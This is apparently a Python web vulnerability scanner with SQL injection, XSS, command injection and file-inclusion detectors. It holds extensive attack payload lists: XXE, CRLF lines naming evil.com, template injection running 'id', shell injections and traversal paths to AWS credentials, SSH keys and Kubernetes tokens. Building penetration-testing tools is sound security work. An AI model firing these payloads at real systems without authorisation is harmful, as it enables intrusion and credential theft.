"""
Native Vulnerability Detection Library

Pure Python implementation of vulnerability detection techniques.
No external CLI tools required - uses only Python libraries.

Features:
- Time-based blind SQL injection detection
- Comparison-based SQL injection detection
- Error-based SQL injection detection
- XSS reflection and context analysis
- Command injection detection

This module extracts techniques from tools like sqlmap and xsstrike
but implements them as pure Python functions.
"""

import re
import time
import hashlib
import difflib
import logging
import requests
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

logger = logging.getLogger(__name__)


class VulnType(Enum):
    SQLI = "sqli"
    XSS = "xss"
    RCE = "rce"
    LFI = "lfi"
    SSTI = "ssti"


class DetectionTechnique(Enum):
    ERROR_BASED = "error-based"
    TIME_BASED = "time-based"
    BOOLEAN_BASED = "boolean-based"
    UNION_BASED = "union-based"
    REFLECTION = "reflection"
    CONTENT_BASED = "content-based"


@dataclass
class DetectionResult:
    """Result from vulnerability detection"""
    vulnerable: bool
    vuln_type: VulnType
    technique: DetectionTechnique
    confidence: float  # 0.0 - 1.0
    payload: str
    evidence: str
    extra_data: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict:
        return {
            'vulnerable': self.vulnerable,
            'vuln_type': self.vuln_type.value,
            'technique': self.technique.value,
            'confidence': self.confidence,
            'payload': self.payload,
            'evidence': self.evidence,
            'extra_data': self.extra_data
        }


# =============================================================================
# PAYLOAD DATABASES
# =============================================================================

class PayloadDB:
    """Database of payloads extracted from security tools"""

    # SQL Injection payloads organized by technique
    SQLI_ERROR_BASED = [
        "'",
        "''",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' UNION SELECT NULL--",
        "' AND 1=CONVERT(int,@@version)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    ]

    SQLI_TIME_BASED = [
        # MySQL
        "' AND SLEEP(5)--",
        "' AND SLEEP(5)#",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR SLEEP(5)--",
        # PostgreSQL
        "'; SELECT pg_sleep(5)--",
        "' AND (SELECT 1 FROM pg_sleep(5))--",
        # SQLite
        "' AND 1=randomblob(500000000)--",
        # MSSQL
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:5')--",
    ]

    SQLI_BOOLEAN_BASED = [
        ("' AND 1=1--", "' AND 1=2--"),  # (true, false) pairs
        ("' AND 'a'='a", "' AND 'a'='b"),
        ("' OR 1=1--", "' OR 1=2--"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' AND SUBSTRING(@@version,1,1)='5", "' AND SUBSTRING(@@version,1,1)='X"),
    ]

    SQLI_UNION_BASED = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,@@version,3--",
        "' UNION SELECT 1,user(),3--",
        "' UNION SELECT 1,database(),3--",
    ]

    # XSS payloads
    XSS_BASIC = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '"><img src=x onerror=alert(1)>',
    ]

    XSS_FILTER_BYPASS = [
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img src=x onerror="alert(1)">',
        '<svg/onload=alert(1)>',
        '<img src=x onerror=alert`1`>',
        '{{constructor.constructor("alert(1)")()}}',
        '<a href="javascript:alert(1)">click</a>',
        '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">',
    ]

    # XXE (XML External Entity) Payloads
    XXE_PAYLOADS = [
        # Basic XXE - Linux file read
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',

        # XXE - Windows file read
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',

        # XXE - PHP wrapper
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',

        # XXE - Parameter entity
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',

        # XXE - SSRF (Server-Side Request Forgery via XXE)
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',

        # Simple XML with entity
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "XXE_TEST_STRING">]><test>&xxe;</test>',
    ]

    # CRLF Injection Payloads (HTTP Response Splitting)
    CRLF_PAYLOADS = [
        # Basic CRLF with newlines
        '%0d%0aSet-Cookie:crlf=injected',
        '%0d%0aX-Injected-Header:crlf',
        '%0ASet-Cookie:test=crlf',
        '%0DSet-Cookie:test=crlf',

        # URL encoded variants
        '%0d%0a%0d%0a<html><body>CRLF</body></html>',
        '%0aLocation:http://evil.com',
        '%0d%0aLocation:%20http://evil.com',

        # Double encoded
        '%250d%250aSet-Cookie:crlf=injected',
        '%250ASet-Cookie:test=crlf',

        # Unicode encoded
        '%u000d%u000aSet-Cookie:crlf=injected',

        # Mixed encoding
        '\\r\\nSet-Cookie:crlf=injected',
        '\\nSet-Cookie:crlf=injected',

        # Space variants (bypasses)
        '%20%0d%0aSet-Cookie:crlf=injected',
        '%00%0d%0aSet-Cookie:crlf=injected',

        # HTTP Response Splitting (complete response)
        '%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>CRLF</html>',

        # Email injection (if in email context)
        '%0aBcc:attacker@evil.com',
        '%0d%0aCc:attacker@evil.com',

        # Simple newline tests
        '\\n',
        '\\r',
        '\\r\\n',
        '%0a',
        '%0d',
        '%0d%0a',
    ]

    # SSTI (Server-Side Template Injection) Payloads
    SSTI_PAYLOADS = [
        # Unique expressions (strongest - result never appears naturally)
        '{{49163*49163}}',      # = 2417001769 (Jinja2, Twig)
        '${49163*49163}',       # FreeMarker, Spring
        '<%= 49163*49163 %>',   # ERB (Ruby)
        '#{49163*49163}',       # EL
        # Classic detection payloads (require baseline verification)
        '{{7*7}}',              # Jinja2, Twig
        '${7*7}',               # Velocity, FreeMarker, Spring
        '<%= 7*7 %>',           # ERB (Ruby)
        '#{7*7}',               # EL (Expression Language)
        '{7*7}',                # Smarty (sometimes)
        '[[7*7]]',              # Twig alternative
        "{{7*'7'}}",            # Jinja2 string

        # Jinja2 specific
        '{{config}}',
        '{{config.items()}}',
        '{{self}}',
        "{{''.__class__.__mro__[2].__subclasses__()}}",

        # Twig specific
        '{{_self}}',
        '{{_self.env}}',
        '{{dump(app)}}',
        "{{['id']|filter('system')}}",

        # FreeMarker specific
        '${7*7}',

        # Velocity specific
        '#set($x=7*7)$x',

        # Smarty specific
        '{$smarty.version}',
        '{if system("id")}{/if}',

        # Pug (Jade)
        '#{7*7}',
        '= 7*7',

        # ERB
        '<%= 7*7 %>',

        # Spring EL
        '${T(java.lang.Runtime).getRuntime().exec("id")}',

        # Safe detection (no RCE)
        '{{7*7}}{{7*7}}',       # Double check
        '${7+7}',               # Addition instead of multiplication
        "{{\'test\'}}",         # Simple string
    ]

    # XPath Injection Payloads
    XPATH_PAYLOADS = [
        # Boolean-based XPath injection
        "' or '1'='1",
        "' or 1=1 or ''='",
        "x' or 1=1 or 'x'='y",
        '" or "1"="1',
        '" or 1=1 or ""="',

        # XPath authentication bypass
        "admin' or '1'='1",
        "' or '1'='1' --",
        "' or '1'='1' /*",

        # XPath syntax errors (detection)
        "test'",
        'test"',
        "test']",
        'test"]',

        # XPath functions
        "' and count(/*)=1 and '1'='1",
        "' and string-length(name(/*[1]))>0 and '1'='1",

        # XPath union (data extraction)
        "' | //user/password | '",
        "' | //user/* | '",
        "' | //* | '",

        # XPath substring (blind)
        "' and substring(//user[1]/password,1,1)='a",
        "test' and substring(name(/*[1]),1,1)='a' and 'a'='a",

        # Comment-based
        "']|[('')|*|@*|node()][('",

        # Advanced
        "'] | /* | a['",
        "x'] | //user[@id=1] | a['a'='a",

        # Error-based
        "1/0",
        "1 div 0",
        "count('string')",
    ]

    # Command injection payloads
    RCE_PAYLOADS = [
        # Echo markers first (causal proof - unique computed values)
        '; echo XRCE$(expr 31337 + 7919)XRCE',
        '| echo XRCE$(expr 31337 + 7919)XRCE',
        '`echo XRCE$(expr 31337 + 7919)XRCE`',
        '$(echo XRCE$(expr 31337 + 7919)XRCE)',
        # Classic command output detection
        '; id',
        '| id',
        '|| id',
        '`id`',
        '$(id)',
        '; whoami',
        '| whoami',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        # Windows
        '& whoami',
        '| dir',
        '; dir',
        '& hostname',
        '| hostname',
        # PowerShell
        '| powershell -c "whoami"',
        # Newline-based
        '%0aid',
        '%0awhoami',
        # Template-style (for eval/exec contexts)
        '__import__("os").popen("id").read()',
        'require("child_process").execSync("id")',
    ]

    # LFI payloads
    LFI_PAYLOADS = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '../../../etc/passwd%00',
        '..%2f..%2f..%2fetc/passwd',
        '%2e%2e%2f%2e%2e%2fetc/passwd',
        '/etc/passwd',
        'file:///etc/passwd',
        # Double-encoded
        '..%252f..%252f..%252fetc/passwd',
        # Unicode bypass
        '..%c0%af..%c0%af..%c0%afetc/passwd',
        # Windows
        '..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\boot.ini',
        '..\\..\\..\\windows\\system.ini',
        # /proc/* files (Linux system info)
        '/proc/version',
        '../proc/version',
        '../../proc/version',
        '../../../proc/version',
        '../../../../proc/version',
        '/../../../../../../../../../../proc/version',
        '/proc/cpuinfo',
        '/proc/meminfo',
        '/proc/self/environ',
        '/proc/self/cmdline',
        '/proc/net/tcp',
        '/proc/1/cgroup',
        # Cloud/Container paths
        '/root/.aws/credentials',
        '/root/.ssh/id_rsa',
        '/var/run/secrets/kubernetes.io/serviceaccount/token',
        '/etc/docker/daemon.json',
        '/.dockerenv',
        '/.env',
        '../.env',
        '../../.env',
        '../../../.env',
        # Application configs
        '../../../wp-config.php',
        '../../config/database.yml',
        '../../../settings.py',
        # PHP wrappers
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/convert.base64-encode/resource=../config.php',
    ]

    # SQL error patterns for error-based detection
    SQL_ERRORS = [
        # MySQL
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"You have an error in your SQL syntax",
        r"Column count doesn't match",
        r"com\.mysql\.jdbc",
        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"ERROR:\s*syntax error at",
        r"syntax error at or near",
        r"unterminated quoted string",
        r"ERROR:\s*relation .* does not exist",
        r"ERROR:\s*column .* does not exist",
        r"org\.postgresql\.util\.PSQLException",
        # MSSQL
        r"Microsoft.*SQL Server.*Driver",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"Unclosed quotation mark",
        r"Incorrect syntax near",
        r"Msg \d+, Level \d+, State \d+",
        r"System\.Data\.SqlClient",
        # Oracle
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"ORA-\d{5}",
        r"PLS-\d{5}",
        r"TNS-\d{5}",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        # SQLite
        r"SQLite.*Exception",
        r"Warning.*sqlite_",
        r"sqlite3\.OperationalError",
        r"unrecognized token",
        r'near ".*?": syntax error',
        r"no such column:",
        r"no such table:",
        # MariaDB
        r"MariaDB.*error",
    ]


# =============================================================================
# SQLI DETECTOR
# =============================================================================

class SQLiDetector:
    """
    SQL Injection detection using multiple techniques.

    Techniques:
    1. Error-based: Look for SQL errors in response
    2. Time-based: Measure response time with SLEEP payloads
    3. Boolean-based: Compare responses for true/false conditions
    4. UNION-based: Detect successful UNION injection
    """

    def __init__(self,
                 session: Optional[requests.Session] = None,
                 timeout: int = 10,
                 time_threshold: float = 4.0,
                 similarity_threshold: float = 0.95):
        """
        Args:
            session: requests Session with cookies/auth
            timeout: Request timeout in seconds
            time_threshold: Seconds to wait for time-based detection
            similarity_threshold: Threshold for boolean-based comparison
        """
        self.session = session or requests.Session()
        self.timeout = timeout
        self.time_threshold = time_threshold
        self.similarity_threshold = similarity_threshold

        # Compile error patterns
        self._error_patterns = [
            re.compile(p, re.I) for p in PayloadDB.SQL_ERRORS
        ]

    def detect(self,
               url: str,
               parameter: str,
               method: str = "GET",
               data: Optional[Dict] = None,
               techniques: Optional[List[str]] = None) -> List[DetectionResult]:
        """
        Test a parameter for SQL injection.

        Args:
            url: Target URL
            parameter: Parameter to test
            method: HTTP method
            data: POST data
            techniques: List of techniques to use (default: all)

        Returns:
            List of DetectionResult for each finding
        """
        results = []

        if techniques is None:
            techniques = ['error', 'time', 'boolean', 'union']

        # Get baseline response
        baseline = self._get_baseline(url, parameter, method, data)
        if baseline is None:
            return results

        # Test each technique
        if 'error' in techniques:
            result = self._test_error_based(url, parameter, method, data)
            if result:
                results.append(result)

        if 'time' in techniques:
            result = self._test_time_based(url, parameter, method, data)
            if result:
                results.append(result)

        if 'boolean' in techniques:
            result = self._test_boolean_based(url, parameter, method, data, baseline)
            if result:
                results.append(result)

        if 'union' in techniques:
            result = self._test_union_based(url, parameter, method, data)
            if result:
                results.append(result)

        return results

    def _get_baseline(self,
                      url: str,
                      parameter: str,
                      method: str,
                      data: Optional[Dict]) -> Optional[requests.Response]:
        """Get baseline response for comparison"""
        try:
            if method.upper() == "GET":
                return self.session.get(url, timeout=self.timeout)
            else:
                return self.session.post(url, data=data, timeout=self.timeout)
        except Exception as e:
            logger.error(f"Failed to get baseline: {e}")
            return None

    def _inject_payload(self,
                        url: str,
                        parameter: str,
                        payload: str,
                        method: str,
                        data: Optional[Dict]) -> Optional[requests.Response]:
        """Inject payload into parameter"""
        try:
            if method.upper() == "GET":
                # Inject into URL
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[parameter] = [payload]
                new_query = urlencode(params, doseq=True)
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                return self.session.get(new_url, timeout=self.timeout)
            else:
                # Inject into POST data
                new_data = (data or {}).copy()
                new_data[parameter] = payload
                return self.session.post(url, data=new_data, timeout=self.timeout)
        except Exception as e:
            logger.debug(f"Injection failed: {e}")
            return None

    def _test_error_based(self,
                          url: str,
                          parameter: str,
                          method: str,
                          data: Optional[Dict]) -> Optional[DetectionResult]:
        """Test for error-based SQL injection"""
        for payload in PayloadDB.SQLI_ERROR_BASED:
            response = self._inject_payload(url, parameter, payload, method, data)
            if response is None:
                continue

            # Check for SQL errors
            for pattern in self._error_patterns:
                match = pattern.search(response.text)
                if match:
                    return DetectionResult(
                        vulnerable=True,
                        vuln_type=VulnType.SQLI,
                        technique=DetectionTechnique.ERROR_BASED,
                        confidence=0.95,
                        payload=payload,
                        evidence=f"SQL error: {match.group()[:100]}",
                    )

        return None

    def _test_time_based(self,
                         url: str,
                         parameter: str,
                         method: str,
                         data: Optional[Dict]) -> Optional[DetectionResult]:
        """Test for time-based blind SQL injection"""
        for payload in PayloadDB.SQLI_TIME_BASED:
            start_time = time.time()
            response = self._inject_payload(url, parameter, payload, method, data)
            elapsed = time.time() - start_time

            if response is None:
                continue

            # Check if response was delayed
            if elapsed >= self.time_threshold:
                # Verify with a non-delayed request
                verify_payload = payload.replace('5', '0').replace("'0:0:5'", "'0:0:0'")
                start_verify = time.time()
                self._inject_payload(url, parameter, verify_payload, method, data)
                verify_elapsed = time.time() - start_verify

                # Confirm if the delay was caused by the payload
                if elapsed - verify_elapsed >= self.time_threshold * 0.8:
                    return DetectionResult(
                        vulnerable=True,
                        vuln_type=VulnType.SQLI,
                        technique=DetectionTechnique.TIME_BASED,
                        confidence=0.90,
                        payload=payload,
                        evidence=f"Response delayed by {elapsed:.1f}s",
                        extra_data={'delay': elapsed}
                    )

        return None

    def _test_boolean_based(self,
                            url: str,
                            parameter: str,
                            method: str,
                            data: Optional[Dict],
                            baseline: requests.Response) -> Optional[DetectionResult]:
        """Test for boolean-based blind SQL injection"""
        for true_payload, false_payload in PayloadDB.SQLI_BOOLEAN_BASED:
            true_resp = self._inject_payload(url, parameter, true_payload, method, data)
            false_resp = self._inject_payload(url, parameter, false_payload, method, data)

            if true_resp is None or false_resp is None:
                continue

            # Calculate similarity
            true_sim = self._calculate_similarity(baseline.text, true_resp.text)
            false_sim = self._calculate_similarity(baseline.text, false_resp.text)
            true_false_sim = self._calculate_similarity(true_resp.text, false_resp.text)

            # If true response is similar to baseline but false is different
            if (true_sim > self.similarity_threshold and
                false_sim < self.similarity_threshold and
                true_false_sim < self.similarity_threshold):
                return DetectionResult(
                    vulnerable=True,
                    vuln_type=VulnType.SQLI,
                    technique=DetectionTechnique.BOOLEAN_BASED,
                    confidence=0.85,
                    payload=f"TRUE: {true_payload} / FALSE: {false_payload}",
                    evidence=f"Response difference detected (sim: {true_false_sim:.2f})",
                    extra_data={
                        'true_similarity': true_sim,
                        'false_similarity': false_sim,
                    }
                )

        return None

    def _test_union_based(self,
                          url: str,
                          parameter: str,
                          method: str,
                          data: Optional[Dict]) -> Optional[DetectionResult]:
        """Test for UNION-based SQL injection"""
        union_markers = ['@@version', 'user()', 'database()', 'VERSION()']

        for payload in PayloadDB.SQLI_UNION_BASED:
            response = self._inject_payload(url, parameter, payload, method, data)
            if response is None:
                continue

            # Check for UNION indicators
            for marker in union_markers:
                if marker.lower() in payload.lower():
                    # Look for version strings, usernames, etc.
                    version_patterns = [
                        r'\d+\.\d+\.\d+[-\w]*',  # MySQL version
                        r'PostgreSQL\s+\d+\.\d+',
                        r'Microsoft SQL Server',
                    ]
                    for pattern in version_patterns:
                        if re.search(pattern, response.text, re.I):
                            return DetectionResult(
                                vulnerable=True,
                                vuln_type=VulnType.SQLI,
                                technique=DetectionTechnique.UNION_BASED,
                                confidence=0.95,
                                payload=payload,
                                evidence=f"UNION injection successful",
                            )

        return None

    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """Calculate similarity ratio between two texts"""
        if not text1 or not text2:
            return 0.0
        # Use quick hash comparison first
        if hashlib.md5(text1.encode()).hexdigest() == hashlib.md5(text2.encode()).hexdigest():
            return 1.0
        # Use difflib for detailed comparison
        return difflib.SequenceMatcher(None, text1[:5000], text2[:5000]).ratio()


# =============================================================================
# XSS DETECTOR
# =============================================================================

class XSSDetector:
    """
    XSS detection using reflection analysis.

    Techniques:
    1. Reflection detection: Check if payload is reflected
    2. Context analysis: Determine HTML/JS/attribute context
    3. Filter bypass: Test encoding bypasses
    """

    def __init__(self,
                 session: Optional[requests.Session] = None,
                 timeout: int = 10):
        self.session = session or requests.Session()
        self.timeout = timeout

    def detect(self,
               url: str,
               parameter: str,
               method: str = "GET",
               data: Optional[Dict] = None) -> List[DetectionResult]:
        """Test a parameter for XSS"""
        results = []

        # Test basic payloads
        for payload in PayloadDB.XSS_BASIC:
            result = self._test_payload(url, parameter, payload, method, data)
            if result:
                results.append(result)
                break  # One confirmed XSS is enough

        # If basic failed, try filter bypass
        if not results:
            for payload in PayloadDB.XSS_FILTER_BYPASS:
                result = self._test_payload(url, parameter, payload, method, data)
                if result:
                    results.append(result)
                    break

        return results

    def _test_payload(self,
                      url: str,
                      parameter: str,
                      payload: str,
                      method: str,
                      data: Optional[Dict]) -> Optional[DetectionResult]:
        """Test a single XSS payload"""
        try:
            if method.upper() == "GET":
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[parameter] = [payload]
                new_query = urlencode(params, doseq=True)
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                response = self.session.get(new_url, timeout=self.timeout)
            else:
                new_data = (data or {}).copy()
                new_data[parameter] = payload
                response = self.session.post(url, data=new_data, timeout=self.timeout)

            # Check for reflection
            if payload in response.text:
                context = self._detect_context(response.text, payload)
                if context in ['html', 'attribute', 'javascript']:
                    return DetectionResult(
                        vulnerable=True,
                        vuln_type=VulnType.XSS,
                        technique=DetectionTechnique.REFLECTION,
                        confidence=0.90 if context == 'html' else 0.80,
                        payload=payload,
                        evidence=f"Reflected in {context} context",
                        extra_data={'context': context}
                    )

        except Exception as e:
            logger.debug(f"XSS test failed: {e}")

        return None

    def _detect_context(self, html: str, payload: str) -> str:
        """Detect the context where payload is reflected"""
        # Find payload position
        pos = html.find(payload)
        if pos == -1:
            return 'none'

        # Check surrounding context
        before = html[max(0, pos-100):pos]
        after = html[pos+len(payload):pos+len(payload)+100]

        # Check if in script tag
        if '<script' in before.lower() and '</script>' in after.lower():
            return 'javascript'

        # Check if in attribute
        attr_pattern = r'[\w-]+\s*=\s*["\']?[^"\']*$'
        if re.search(attr_pattern, before):
            return 'attribute'

        # Check if in HTML
        if re.search(r'<[^>]*$', before) or re.search(r'^[^<]*>', after):
            return 'tag'

        return 'html'


# =============================================================================
# UNIFIED DETECTOR
# =============================================================================

# =============================================================================
# RCE DETECTOR
# =============================================================================

class RCEDetector:
    """
    Remote Code Execution detection using command output analysis.

    Techniques:
    1. Output-based: Look for command output in response
    2. Time-based: Measure response time with sleep/ping payloads
    """

    # Patterns indicating successful command execution
    _COMMAND_OUTPUT_PATTERNS = [
        re.compile(r'uid=\d+\([^)]+\)\s+gid=\d+', re.I),  # id command
        re.compile(r'^(root|www-data|apache|nginx|httpd|nobody)$', re.M | re.I),  # whoami
        re.compile(r'Linux\s+\S+\s+\d+\.\d+', re.I),  # uname
        re.compile(r'(drwx|Directory of|Volume Serial)', re.I),  # dir/ls
    ]

    def __init__(self,
                 session: Optional[requests.Session] = None,
                 timeout: int = 10):
        self.session = session or requests.Session()
        self.timeout = timeout

    def detect(self,
               url: str,
               parameter: str,
               method: str = "GET",
               data: Optional[Dict] = None) -> List[DetectionResult]:
        """Test a parameter for RCE"""
        results = []

        for payload in PayloadDB.RCE_PAYLOADS[:10]:  # Limit to first 10
            try:
                response = self._inject_payload(url, parameter, payload, method, data)
                if response is None:
                    continue

                for pattern in self._COMMAND_OUTPUT_PATTERNS:
                    if pattern.search(response.text):
                        results.append(DetectionResult(
                            vulnerable=True,
                            vuln_type=VulnType.RCE,
                            technique=DetectionTechnique.CONTENT_BASED,
                            confidence=0.95,
                            payload=payload,
                            evidence=f"Command output detected: {pattern.pattern[:50]}",
                        ))
                        return results  # One confirmed RCE is enough
            except Exception as e:
                logger.debug(f"RCE test failed: {e}")

        return results

    def _inject_payload(self, url, parameter, payload, method, data):
        """Inject payload into parameter"""
        try:
            if method.upper() == "GET":
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[parameter] = [payload]
                new_query = urlencode(params, doseq=True)
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                return self.session.get(new_url, timeout=self.timeout)
            else:
                new_data = (data or {}).copy()
                new_data[parameter] = payload
                return self.session.post(url, data=new_data, timeout=self.timeout)
        except Exception:
            return None


# =============================================================================
# LFI DETECTOR
# =============================================================================

class LFIDetector:
    """
    Local File Inclusion detection using file content analysis.

    Techniques:
    1. Content-based: Look for known file content signatures in response
    """

    # Patterns indicating successful file inclusion
    _FILE_CONTENT_PATTERNS = [
        re.compile(r'root:x?:0:0:.*?:/root:', re.I),  # /etc/passwd
        re.compile(r'\[boot\s+loader\]', re.I),  # boot.ini
        re.compile(r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----', re.I),  # SSH keys
        re.compile(r'DB_PASSWORD\s*=', re.I),  # .env
    ]

    def __init__(self,
                 session: Optional[requests.Session] = None,
                 timeout: int = 10):
        self.session = session or requests.Session()
        self.timeout = timeout

    def detect(self,
               url: str,
               parameter: str,
               method: str = "GET",
               data: Optional[Dict] = None) -> List[DetectionResult]:
        """Test a parameter for LFI"""
        results = []

        for payload in PayloadDB.LFI_PAYLOADS[:15]:  # Limit to first 15
            try:
                response = self._inject_payload(url, parameter, payload, method, data)
                if response is None:
                    continue

                for pattern in self._FILE_CONTENT_PATTERNS:
                    if pattern.search(response.text):
                        results.append(DetectionResult(
                            vulnerable=True,
                            vuln_type=VulnType.LFI,
                            technique=DetectionTechnique.CONTENT_BASED,
                            confidence=0.95,
                            payload=payload,
                            evidence=f"File content detected: {pattern.pattern[:50]}",
                        ))
                        return results  # One confirmed LFI is enough
            except Exception as e:
                logger.debug(f"LFI test failed: {e}")

        return results

    def _inject_payload(self, url, parameter, payload, method, data):
        """Inject payload into parameter"""
        try:
            if method.upper() == "GET":
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[parameter] = [payload]
                new_query = urlencode(params, doseq=True)
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                return self.session.get(new_url, timeout=self.timeout)
            else:
                new_data = (data or {}).copy()
                new_data[parameter] = payload
                return self.session.post(url, data=new_data, timeout=self.timeout)
        except Exception:
            return None


# =============================================================================
# UNIFIED DETECTOR
# =============================================================================

class VulnDetector:
    """
    Unified vulnerability detector using pure Python libraries.

    Usage:
        detector = VulnDetector(cookies={'PHPSESSID': 'xxx'})
        results = detector.scan(
            url='http://target/page.php',
            parameter='id',
            vuln_types=['sqli', 'xss', 'rce', 'lfi']
        )
    """

    def __init__(self,
                 cookies: Optional[Dict[str, str]] = None,
                 headers: Optional[Dict[str, str]] = None,
                 timeout: int = 10,
                 verify_ssl: bool = False):
        """
        Initialize detector with session config.
        """
        self.session = requests.Session()
        self.session.verify = verify_ssl

        if cookies:
            self.session.cookies.update(cookies)
        if headers:
            self.session.headers.update(headers)

        self.timeout = timeout
        self.sqli_detector = SQLiDetector(self.session, timeout)
        self.xss_detector = XSSDetector(self.session, timeout)
        self.rce_detector = RCEDetector(self.session, timeout)
        self.lfi_detector = LFIDetector(self.session, timeout)

    def scan(self,
             url: str,
             parameter: str,
             method: str = "GET",
             data: Optional[Dict] = None,
             vuln_types: Optional[List[str]] = None) -> List[DetectionResult]:
        """
        Scan a parameter for vulnerabilities.

        Args:
            url: Target URL
            parameter: Parameter to test
            method: HTTP method
            data: POST data
            vuln_types: Types to test ('sqli', 'xss', 'rce', 'lfi')

        Returns:
            List of DetectionResult
        """
        results = []
        vuln_types = vuln_types or ['sqli', 'xss']

        if 'sqli' in vuln_types:
            sqli_results = self.sqli_detector.detect(url, parameter, method, data)
            results.extend(sqli_results)

        if 'xss' in vuln_types:
            xss_results = self.xss_detector.detect(url, parameter, method, data)
            results.extend(xss_results)

        if 'rce' in vuln_types:
            rce_results = self.rce_detector.detect(url, parameter, method, data)
            results.extend(rce_results)

        if 'lfi' in vuln_types:
            lfi_results = self.lfi_detector.detect(url, parameter, method, data)
            results.extend(lfi_results)

        return results

    def scan_endpoints(self,
                       endpoints: List[Dict],
                       max_workers: int = 3) -> List[DetectionResult]:
        """
        Scan multiple endpoints in parallel.

        Args:
            endpoints: List from crawler with 'url', 'parameters', etc.
            max_workers: Concurrent workers

        Returns:
            All detection results
        """
        all_results = []

        for endpoint in endpoints:
            url = endpoint.get('url', '')
            method = endpoint.get('method', 'GET')

            for param in endpoint.get('parameters', []):
                param_name = param.get('name', '')
                predicted = param.get('predicted_vulns', [])

                # Get vuln types to test
                vuln_types = list(set(v.get('type', '') for v in predicted))

                if vuln_types:
                    results = self.scan(url, param_name, method, vuln_types=vuln_types)
                    all_results.extend(results)

        return all_results
